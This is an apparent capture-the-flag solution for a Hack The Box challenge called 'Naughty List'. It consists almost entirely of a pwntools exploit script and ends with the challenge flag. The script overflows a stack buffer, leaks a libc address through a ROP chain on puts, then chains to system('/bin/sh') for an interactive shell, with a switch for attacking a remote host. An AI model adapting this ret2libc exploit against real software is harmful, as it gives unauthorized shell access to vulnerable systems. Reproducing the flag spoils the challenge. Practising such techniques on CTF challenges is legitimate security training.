# Naughty List

### Solution
```
#!/usr/bin/env python3
from pwn import *

elf = ELF('./naughty_list')
rop = ROP(elf)

local = True

if(local == True):
	p = elf.process()
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec = False)
else:
	p = remote(ip, port)
	libc = ELF('./libc.so.6', checksec = False)

p.sendlineafter(b':', b'myName')
p.sendlineafter(b':', b'mySurname')
p.sendlineafter(b':', b'20')

get_desc_address = 0x000000000040102b	# objdump -t naughty_list
puts_got_address = elf.got["puts"]
puts_plt_address = elf.plt["puts"]
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]

payload = b'A' * 40
payload += p64(pop_rdi) 
payload += p64(puts_got_address) 
payload += p64(puts_plt_address) 
payload += p64(get_desc_address)

p.sendline(payload)
p.recvuntil(b'will take a better look and hopefuly you will get your')
p.recvline()

leaked_libc_puts = u64(p.recvline()[:-1].ljust(8, b'\x00'))
libc_base_address = leaked_libc_puts - libc.symbols['puts']
print("Leaked LIBC Base Address: ", hex(libc_base_address))

rop = ROP(libc)

system = libc_base_address + libc.symbols['system']
bin_sh = libc_base_address + next(libc.search(b"/bin/sh"))
pop_rdi = libc_base_address + (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = libc_base_address + (rop.find_gadget(['ret']))[0]

payload = b'A' * 40 
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

p.clean()
p.sendline(payload)
p.interactive()
```

**Flag:** `HTB{u_w1ll_b3_n4ughtyf13d_1f_u_4r3_g3tt1ng_4_g1ft}`
